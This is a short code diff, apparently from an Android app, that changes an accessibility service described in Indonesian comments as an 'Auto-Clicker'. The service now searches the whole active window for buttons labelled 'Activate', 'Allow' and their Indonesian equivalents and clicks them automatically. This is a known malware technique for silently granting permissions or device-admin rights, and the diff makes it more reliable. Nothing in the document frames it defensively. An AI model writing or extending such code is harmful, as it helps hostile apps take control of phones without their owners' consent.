@@ -9,14 +9,17 @@ public class CustomAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getSource() == null) return;
+        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+        if (rootNode == null) return;
 
         // Logika "Auto-Clicker"
         // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
-        checkAndClick(event.getSource(), "Activate");
-        checkAndClick(event.getSource(), "Aktifkan");
-        checkAndClick(event.getSource(), "Allow");
-        checkAndClick(event.getSource(), "Izinkan");
+        checkAndClick(rootNode, "Activate");
+        checkAndClick(rootNode, "Aktifkan");
+        checkAndClick(rootNode, "Allow");
+        checkAndClick(rootNode, "Izinkan");
+        
+        rootNode.recycle();
     }
 
     private void checkAndClick(AccessibilityNodeInfo node, String text) {
